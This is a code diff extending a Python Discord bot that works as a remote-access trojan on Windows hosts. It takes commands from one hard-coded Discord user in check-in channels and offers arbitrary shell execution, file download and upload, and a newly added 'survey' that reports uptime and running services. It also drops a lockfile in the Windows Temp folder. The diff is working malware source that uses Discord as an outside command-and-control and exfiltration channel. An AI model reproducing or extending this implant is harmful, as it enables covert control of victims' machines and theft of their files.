@@ -5,15 +5,18 @@
     Please reach out to INSERT_NAME with any questions.
 """
 
+import ctypes
 import json
 import os
 import platform
 import random
-import requests
+import re
 import socket
 import string
 import subprocess
+from datetime import timedelta
 from pathlib import Path
+from tabulate import tabulate  # pip install tabulate
 
 import discord
 from discord.ext import commands
@@ -22,15 +25,14 @@ DISCORD_TOKEN = Path("E:\\CompSci\\lenny_token.txt").read_text(encoding="utf-8")
 CHECKIN_CHANNELS = set()
 LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
 JSON_FORMAT_PREFIX = "```json\n"
+BOT_LISTEN_FOR_ID = 558898662772572160
 
 """
 TODO: Interesting stuff to add:
-- Put file from server to client
 - A way to load third-party python packages.
   e.g. request from the server, and drop the wheel to disk, and then import.
 - Find a standard library way to bootstrap. Currently we require a few different 3p packages.
 - Screenshot capability?
-- Survey capability
 - Clean up the exit function
 """
 
@@ -109,6 +111,43 @@ def get_local_user_accounts():
 
     return users
 
+def get_services():
+    output = subprocess.check_output("sc query type= service state= all", shell=True, text=True)
+
+    services = []
+    current = {}
+
+    for line in output.splitlines():
+        line = line.strip()
+        if line.startswith("SERVICE_NAME:"):
+            # save the previous one
+            if current:
+                services.append(current)
+
+            current = {"SERVICE_NAME": line.split(":", 1)[1].strip()}
+        elif line.startswith("DISPLAY_NAME:") and current is not None:
+            current["DISPLAY_NAME"] = line.split(":", 1)[1].strip()
+        elif line.startswith("STATE") and current is not None:
+            # Example line: "STATE              : 4  RUNNING"
+            match = re.search(r":\s+\d+\s+(\w+)", line)
+            if match:
+                current["STATE"] = match.group(1)
+
+    if current:
+        services.append(current)
+
+    return services
+
+def get_uptime():
+    """
+        Returns the uptime of the device.
+        Prevent overflow by ensuring ret type is unsigned 64-bit.
+    """
+    GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
+    GetTickCount64.restype = ctypes.c_ulonglong
+
+    return timedelta(milliseconds=GetTickCount64())
+
 def get_local_admin_status():
     """
         Returns true if the current process is running under a local admin,
@@ -165,7 +204,15 @@ def process_command(cmd_str):
     """
         Parse command and pass to the appropriate function.
     """
-    usage_string = "Invalid command.\n\nUsage:\ncd <directory>\nexec <cmd>\nget <file>\nexit"
+    usage_string = "Invalid command.\n\n"
+    usage_string += "Usage:\n"
+    usage_string += "cd <directory>\n"
+    usage_string += "exec <cmd>\n"
+    usage_string += "get <file path>\n"
+    usage_string += "put <file path>\n"
+    usage_string += "pwd\n"
+    usage_string += "survey\n"
+    usage_string += "exit"
 
     parts = cmd_str.split(maxsplit=1)
     if not parts:
@@ -179,7 +226,8 @@ def process_command(cmd_str):
     # Make a 'survey' option which bundles commands
     commands = {
         "exec": execute_command,
-        "get": get_content
+        "get": get_content,
+        "survey": run_survey
     }
 
     # This is a bit buggy at the moment, prints a stack trace when its done
@@ -189,8 +237,12 @@ def process_command(cmd_str):
     elif cmd == "help":
         # Output usage string, but be nicer (they asked for help after all)
         output = usage_string.replace("Invalid command.","")
+    elif cmd == "survey":
+        output = run_survey()
     elif cmd == "cd":
         output = change_directory(cmd_str)
+    elif cmd == "pwd":
+        output = f"CWD: {os.getcwd()}"
     elif cmd in commands:
         output = commands[cmd](arg)
     else:
@@ -254,6 +306,31 @@ def get_content(upload):
     except Exception as e:
         return str(e)
 
+def run_survey():
+    """
+        Return some basic device information.
+    """
+    survey_results = "-"*16+"\n"
+    survey_results += "SURVEY RESULTS\n"
+    survey_results += "-"*16+"\n\n"
+    survey_results += f"Uptime: {get_uptime()}\n"
+    survey_results += "Service listing:\n"
+    survey_results += display_services(svc_state="RUNNING")
+    return survey_results
+
+def display_services(svc_state="ALL"):
+    """
+        Return a table of services matching the given state.
+    """
+    services = get_services()
+    if svc_state == "ALL":
+        services = [s for s in get_services()]
+    else:
+        services = [s for s in get_services() if s.get("STATE") == svc_state]
+
+    table = [(s["SERVICE_NAME"], s.get("DISPLAY_NAME", ""), s.get("STATE", "")) for s in services]
+    return tabulate(table, headers=["Service Name", "Display Name", "State"], tablefmt="github")
+
 def do_exit():
     # Any cleanup stuff can go here
     exit()
@@ -307,10 +384,10 @@ async def on_message(message):
     if message.channel.name not in CHECKIN_CHANNELS:
         return
 
-    if(message.author.id == 558898662772572160):
+    if(message.author.id == BOT_LISTEN_FOR_ID):
         if message.content.strip().lower().startswith("put"):
             if not message.attachments:
-                # If they typed put but didnt attach anything, error
+                # If the user typed put but didnt attach anything, error
                 output = "Error: you must attach a file with the 'put' command."
             else:
                 output = await process_put_file(message.attachments, message.content)
